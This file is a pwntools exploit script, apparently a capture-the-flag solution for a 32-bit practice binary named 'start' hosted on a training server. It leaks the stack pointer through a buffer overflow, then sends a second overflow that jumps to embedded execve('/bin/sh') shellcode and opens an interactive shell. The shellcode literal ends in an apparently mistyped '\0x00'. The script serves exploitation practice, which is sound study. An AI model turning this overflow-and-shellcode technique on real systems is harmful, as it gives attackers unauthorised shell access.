import sys
from pwn import *
from ctypes import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./start')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./start')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',25482)
			elf=ELF('./start')
			libc=ELF('../../i386libc/libc.so.6')


	#	bss_1=elf.bss()+0x200

		io.recv()
		# gdb.attach(io)
		a="a"*20+p32(0x8048087)
		shellcode="\xEB\x0B\x31\xC0\x31\xC9\x31\xD2\xB0\x0B\x5B\xCD\x80\xE8\xF0\xFF\xFF\xFF/bin/sh\0x00"
		io.send(a)
		esp=io.recv(4)
		esp=u32(esp)
		sleep(1)
		shell="a"*20+p32(esp+0x14)+shellcode
		io.send(shell)

		# success('libc_base:'+hex(libc_base))
		
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue